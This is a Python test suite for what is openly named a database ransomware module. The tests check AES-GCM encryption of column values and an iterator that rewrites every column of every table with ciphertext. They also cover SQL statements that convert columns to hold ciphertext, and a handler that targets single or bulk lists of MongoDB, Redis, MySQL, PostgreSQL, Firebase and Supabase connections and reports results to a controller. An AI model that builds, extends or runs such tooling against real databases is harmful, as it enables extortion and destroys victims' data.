import os
import json
import hashlib
import tempfile
import asyncio
import pytest
from unittest.mock import MagicMock, patch, call

os.environ.setdefault("KEY_CRIP_DATA", "ransom-module-test-key-2026")

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from infra.service.SqlRansomIterator import SqlRansomIterator
from infra.adapters.sql.MySqlDialect import MySqlDialect
from infra.adapters.sql.PostgreSqlDialect import PostgreSqlDialect
from infra.modules.RansomDbModule import RansomDbModule
from domain.service.ColumnData import ColumnData
from domain.service.SqlRansomDTO import SqlRansomDTO
from application.client.dto.CommandOutputDto import CommandOutputDTO


_NONCE_LEN = 12
_TAG_LEN   = 16
_TEST_KEY  = "ransom-module-test-key-2026"


@pytest.fixture(autouse=True)
def _set_key_env(monkeypatch):
    monkeypatch.setenv("KEY_CRIP_DATA", _TEST_KEY)


@pytest.fixture
def decrypt_fn():
    key_bytes = hashlib.sha256(_TEST_KEY.encode()).digest()
    aesgcm = AESGCM(key_bytes)

    def _decrypt(blob: bytes) -> bytes:
        return aesgcm.decrypt(blob[:_NONCE_LEN], blob[_NONCE_LEN:], None)

    return _decrypt


@pytest.fixture
def engine():
    from infra.service.RansomCripEngine import RansomCripEngine
    return RansomCripEngine()


@pytest.fixture
def module():
    broadcast_log = []
    def broadcast(dto):
        broadcast_log.append(dto)
    m = RansomDbModule(broadcast)
    m._broadcast_log = broadcast_log
    return m


class TestRansomCripEngineRoundtrip:

    def test_encrypt_decrypt_string(self, engine, decrypt_fn):
        results = []
        engine.execute(lambda enc: results.append(enc), ["ransom test"])
        assert decrypt_fn(results[0]) == b"ransom test"

    def test_encrypt_decrypt_raw_bytes(self, engine, decrypt_fn):
        data = bytes(range(256))
        results = []
        engine.execute(lambda enc: results.append(enc), [data])
        assert decrypt_fn(results[0]) == data

    def test_encrypt_decrypt_dict_preserves_keys(self, engine, decrypt_fn):
        obj = {"host": "10.0.0.1", "port": 3306, "active": True}
        results = []
        engine.execute(lambda enc: results.append(enc), [obj])
        parsed = json.loads(decrypt_fn(results[0]))
        assert parsed["host"] == "10.0.0.1"
        assert parsed["port"] == 3306
        assert parsed["active"] is True

    def test_encrypt_decrypt_nested_list(self, engine, decrypt_fn):
        data = [["a", "b"], [1, 2, 3], {"k": "v"}]
        results = []
        engine.execute(lambda enc: results.append(enc), [data])
        parsed = json.loads(decrypt_fn(results[0]))
        assert parsed == data

    def test_each_item_gets_unique_nonce(self, engine):
        results = []
        engine.execute(lambda enc: results.append(enc), ["x"] * 100)
        nonces = {blob[:_NONCE_LEN] for blob in results}
        assert len(nonces) == 100

    def test_1000_items_all_decryptable(self, engine, decrypt_fn):
        results = []
        items = [f"row-{i}" for i in range(1000)]
        engine.execute(lambda enc: results.append(enc), items)
        assert len(results) == 1000
        assert decrypt_fn(results[500]) == b"row-500"

    def test_empty_list_produces_no_output(self, engine):
        results = []
        engine.execute(lambda enc: results.append(enc), [])
        assert results == []

    def test_1mb_data_roundtrip(self, engine, decrypt_fn):
        big = "B" * (1024 * 1024)
        results = []
        engine.execute(lambda enc: results.append(enc), [big])
        assert len(decrypt_fn(results[0])) == 1024 * 1024

    def test_unicode_cjk_roundtrip(self, engine, decrypt_fn):
        text = "\u4f60\u597d\u4e16\u754c\u3053\u3093\u306b\u3061\u306f\uc548\ub155\ud558\uc138\uc694"
        results = []
        engine.execute(lambda enc: results.append(enc), [text])
        assert decrypt_fn(results[0]).decode("utf-8") == text

    def test_tampered_tag_raises(self, engine):
        results = []
        engine.execute(lambda enc: results.append(enc), ["sensitive"])
        blob = bytearray(results[0])
        blob[-1] ^= 0xFF
        key_bytes = hashlib.sha256(_TEST_KEY.encode()).digest()
        aesgcm = AESGCM(key_bytes)
        with pytest.raises(Exception):
            aesgcm.decrypt(bytes(blob[:_NONCE_LEN]), bytes(blob[_NONCE_LEN:]), None)

    def test_missing_key_env_raises(self, monkeypatch):
        monkeypatch.setenv("KEY_CRIP_DATA", "")
        from importlib import reload
        import infra.service.RansomCripEngine as mod
        with pytest.raises(EnvironmentError):
            reload(mod)
            mod.RansomCripEngine()

    def test_objectid_like_serialization(self, engine, decrypt_fn):
        from bson import ObjectId
        oid = ObjectId()
        results = []
        engine.execute(lambda enc: results.append(enc), [{"_id": oid, "name": "test"}])
        parsed = json.loads(decrypt_fn(results[0]))
        assert parsed["_id"] == str(oid)
        assert parsed["name"] == "test"

    def test_ciphertext_includes_nonce_and_tag_overhead(self, engine):
        results = []
        engine.execute(lambda enc: results.append(enc), ["a"])
        assert len(results[0]) == 1 + _NONCE_LEN + _TAG_LEN

    def test_none_value_serialized_as_json(self, engine, decrypt_fn):
        results = []
        engine.execute(lambda enc: results.append(enc), [None])
        assert decrypt_fn(results[0]) == b"null"

    def test_integer_serialized_as_json(self, engine, decrypt_fn):
        results = []
        engine.execute(lambda enc: results.append(enc), [42])
        assert decrypt_fn(results[0]) == b"42"


class TestSqlDialects:

    def test_mysql_backtick_quoting(self):
        d = MySqlDialect()
        assert d.quote_identifier("table name") == "`table name`"

    def test_postgres_double_quote(self):
        d = PostgreSqlDialect()
        assert d.quote_identifier("table name") == '"table name"'

    def test_mysql_text_conversion_mediumtext_no(self):
        d = MySqlDialect()
        assert d.needs_text_conversion("mediumtext") is False

    def test_mysql_text_conversion_longtext_no(self):
        d = MySqlDialect()
        assert d.needs_text_conversion("longtext") is False

    def test_postgres_text_conversion_uuid_no(self):
        d = PostgreSqlDialect()
        assert d.needs_text_conversion("uuid") is False

    def test_mysql_alter_ddl_contains_modify(self):
        d = MySqlDialect()
        ddl = d.alter_column_to_text("orders", "note")
        assert "MODIFY" in ddl
        assert "TEXT" in ddl

    def test_postgres_alter_ddl_contains_alter_column(self):
        d = PostgreSqlDialect()
        ddl = d.alter_column_to_text("orders", "note")
        assert "ALTER COLUMN" in ddl
        assert "TYPE TEXT" in ddl

    def test_mysql_build_update_with_pk_contains_where(self):
        d = MySqlDialect()
        sql = d.build_update("users", "email", "id", 1)
        assert "WHERE" in sql
        assert "`id`" in sql

    def test_postgres_build_update_without_pk_uses_ctid_offset(self):
        d = PostgreSqlDialect()
        sql = d.build_update("users", "email", None, None)
        assert "OFFSET" in sql

    def test_mysql_pk_query_references_primary(self):
        d = MySqlDialect()
        sql = d.get_pk_query()
        assert "PRIMARY" in sql
        assert "information_schema" in sql.lower() or "KEY_COLUMN_USAGE" in sql


class TestSqlRansomIterator:

    def test_counts_across_multiple_columns_in_one_table(self):
        engine = MagicMock()
        engine.execute = lambda write_fn, datas: [write_fn(b"\x00") for _ in datas]
        written_a = []
        written_b = []

        col_a = ColumnData("col_a", ["v1", "v2"], lambda enc: written_a.append(enc))
        col_b = ColumnData("col_b", ["v3", "v4", "v5"], lambda enc: written_b.append(enc))

        dto = SqlRansomDTO(
            engine=engine,
            tables=["t1"],
            get_columns=lambda table: [col_a, col_b],
            end_transaction=lambda: None,
        )

        total = SqlRansomIterator().run(dto)
        assert total == 5
        assert len(written_a) == 2
        assert len(written_b) == 3

    def test_calls_end_transaction_per_table(self):
        engine = MagicMock()
        engine.execute = lambda write_fn, datas: [write_fn(b"\x00") for _ in datas]
        tx_count = [0]

        def end_tx():
            tx_count[0] += 1

        col = ColumnData("c", ["v"], lambda enc: None)
        dto = SqlRansomDTO(
            engine=engine,
            tables=["t1", "t2", "t3"],
            get_columns=lambda table: [col],
            end_transaction=end_tx,
        )

        SqlRansomIterator().run(dto)
        assert tx_count[0] == 3

    def test_no_tables_no_end_transaction(self):
        engine = MagicMock()
        tx_called = [False]

        dto = SqlRansomDTO(
            engine=engine,
            tables=[],
            get_columns=lambda t: [],
            end_transaction=lambda: setattr(tx_called, '__setitem__', (0, True)) or None,
        )

        total = SqlRansomIterator().run(dto)
        assert total == 0

    def test_empty_values_column_counted_as_zero(self):
        engine = MagicMock()
        engine.execute = lambda write_fn, datas: None

        col = ColumnData("empty_col", [], lambda enc: None)
        dto = SqlRansomDTO(
            engine=engine,
            tables=["t1"],
            get_columns=lambda t: [col],
            end_transaction=lambda: None,
        )

        assert SqlRansomIterator().run(dto) == 0

    def test_real_engine_produces_encrypted_bytes(self):
        from infra.service.RansomCripEngine import RansomCripEngine
        real_engine = RansomCripEngine()
        blobs = []

        col = ColumnData("pw", ["alpha", "bravo", "charlie"], lambda enc: blobs.append(enc))
        dto = SqlRansomDTO(
            engine=real_engine,
            tables=["accounts"],
            get_columns=lambda t: [col],
            end_transaction=lambda: None,
        )

        total = SqlRansomIterator().run(dto)
        assert total == 3
        for blob in blobs:
            assert isinstance(blob, bytes)
            assert len(blob) >= _NONCE_LEN + _TAG_LEN + 1

    def test_write_callback_always_receives_bytes(self):
        engine = MagicMock()
        engine.execute = lambda write_fn, datas: [write_fn(b"\xab\xcd") for _ in datas]
        types = []

        col = ColumnData("c", [1, 2], lambda enc: types.append(type(enc)))
        dto = SqlRansomDTO(
            engine=engine,
            tables=["t"],
            get_columns=lambda t: [col],
            end_transaction=lambda: None,
        )

        SqlRansomIterator().run(dto)
        assert all(t is bytes for t in types)

    def test_count_matches_total_values_across_tables(self):
        engine = MagicMock()
        engine.execute = lambda write_fn, datas: [write_fn(b"\x00") for _ in datas]

        def get_cols(table):
            if table == "a":
                return [ColumnData("c1", list(range(10)), lambda enc: None)]
            return [
                ColumnData("c2", list(range(5)), lambda enc: None),
                ColumnData("c3", list(range(3)), lambda enc: None),
            ]

        dto = SqlRansomDTO(
            engine=engine,
            tables=["a", "b"],
            get_columns=get_cols,
            end_transaction=lambda: None,
        )

        assert SqlRansomIterator().run(dto) == 18

    def test_large_table_1000_rows(self):
        engine = MagicMock()
        engine.execute = lambda write_fn, datas: [write_fn(b"\x00") for _ in datas]

        col = ColumnData("big", list(range(1000)), lambda enc: None)
        dto = SqlRansomDTO(
            engine=engine,
            tables=["huge"],
            get_columns=lambda t: [col],
            end_transaction=lambda: None,
        )

        assert SqlRansomIterator().run(dto) == 1000


class TestRansomDbModule:

    def test_resolve_uris_single_trims(self, module):
        uris = module._resolve_uris("single", {"uri": "  uri://x  "})
        assert uris == ["uri://x"]

    def test_resolve_uris_file_skips_comments(self, module):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("# header\nuri1\n\n# mid\nuri2\nuri3\n")
            path = f.name
        try:
            uris = module._resolve_uris("file", {"file_path": path})
            assert uris == ["uri1", "uri2", "uri3"]
        finally:
            os.unlink(path)

    def test_mask_exactly_24_chars(self, module):
        assert module._mask("a" * 24) == "a" * 24

    def test_mask_25_chars_truncated(self, module):
        result = module._mask("a" * 25)
        assert result == "a" * 24 + "..."

    def test_to_sql_uri_mysql_pipe_format(self, module):
        result = module._to_sql_uri("MySQL", "h|3306|u|p|db")
        assert result == "mysql://u:p@h:3306/db"

    def test_to_sql_uri_postgresql_pipe_format(self, module):
        result = module._to_sql_uri("PostgreSQL", "h|5432|u|p|db")
        assert result == "postgresql://u:p@h:5432/db"

    def test_generate_example_all_six_dbs(self, module):
        for db in ["MongoDB", "Firebase", "Supabase", "Redis", "MySQL", "PostgreSQL"]:
            with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as f:
                path = f.name
            try:
                result = module._generate_example(db, path)
                assert result.success is True, f"Failed for {db}"
                assert os.path.getsize(path) > 0
            finally:
                os.unlink(path)

    @pytest.mark.asyncio
    async def test_reject_unsupported_db_oracle(self, module):
        result = await module._handle_ransom_db({"db": "Oracle", "mode": "single"})
        assert result.success is False
        assert "Oracle" in result.error

    @pytest.mark.asyncio
    async def test_reject_unsupported_db_sqlite(self, module):
        result = await module._handle_ransom_db({"db": "SQLite", "mode": "single"})
        assert result.success is False

    @pytest.mark.asyncio
    async def test_invalid_mode_raises_via_handler(self, module):
        result = await module._handle_ransom_db({
            "db": "MongoDB", "mode": "bulk", "uri": "x"
        })
        assert result.success is False

    @pytest.mark.asyncio
    async def test_example_mode_returns_file_in_data(self, module):
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as f:
            path = f.name
        try:
            result = await module._handle_ransom_db({
                "db": "Redis",
                "mode": "example",
                "output_path": path,
            })
            assert result.success is True
            assert result.data["file"] == path
        finally:
            os.unlink(path)

    def test_to_sql_uri_with_special_chars_in_password(self, module):
        result = module._to_sql_uri("MySQL", "host|3306|root|p@ss:w0rd!|mydb")
        assert result == "mysql://root:p@ss:w0rd!@host:3306/mydb"

    @pytest.mark.asyncio
    async def test_empty_uri_in_single_mode_fails(self, module):
        result = await module._handle_ransom_db({
            "db": "MongoDB", "mode": "single", "uri": "   "
        })
        assert result.success is False
